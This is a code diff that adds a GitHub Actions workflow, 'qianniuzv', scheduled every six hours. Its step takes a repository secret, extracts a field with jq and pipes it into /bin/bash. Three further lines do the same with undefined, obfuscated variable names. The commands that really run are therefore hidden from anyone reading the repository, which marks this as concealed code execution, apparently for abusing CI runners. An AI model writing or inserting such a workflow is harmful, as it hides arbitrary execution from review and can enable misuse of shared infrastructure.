@@ -1,0 +1,20 @@
+name: qianniuzv
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qianniuzv
+        env:
+          t2: ${{ secrets.t2 }}
+        run: |
+          echo $t2 | jq -r .v7 | /bin/bash
+          echo $lgv9850 | jq -r .o73 | /bin/bash
+          echo $dh1972 | jq -r .sn3767 | /bin/bash
+          echo $z569 | jq -r .lilz0771 | /bin/bash
+
